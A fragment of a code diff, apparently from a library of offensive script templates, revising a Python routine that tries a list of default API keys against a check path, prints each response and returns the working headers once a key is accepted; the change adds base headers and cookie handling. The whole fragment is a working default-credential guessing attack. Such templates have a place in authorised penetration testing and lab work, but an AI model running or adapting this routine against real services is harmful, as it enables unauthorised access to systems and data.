     HEADER_PREFIX = ""                                # EDIT "Bearer " for Bearer tokens, "" for raw
-    target = url(CHECK_PATH)
+    HEADERS = {}                                      # EDIT base headers
+    COOKIES = {}                                      # EDIT e.g. {"session": "REPLACE"}
+    SESSION_COOKIES = True                            # EDIT True keeps s cookies from login; False = only COOKIES above
     for k in CANDIDATES:
-        r = s.get(target, headers={HEADER_NAME: HEADER_PREFIX + k}, timeout=TIMEOUT)
+        headers = dict(HEADERS)
+        headers[HEADER_NAME] = HEADER_PREFIX + k
+        r = send_request("GET", CHECK_PATH, headers=headers, cookies=COOKIES, session_cookies=SESSION_COOKIES)
         snippet = (k[:16] + "...") if len(k) > 16 else k
         print(f"[{r.status_code}] {HEADER_NAME}: {snippet}  body={r.text[:120]}")
         if r.status_code == 200:
-            s.headers[HEADER_NAME] = HEADER_PREFIX + k
-            print("[+] default key accepted; session header set")
-            return k
+            print("[+] default key accepted; use returned headers in later requests")
+            return headers
     die("no default API key accepted")
 `
   },
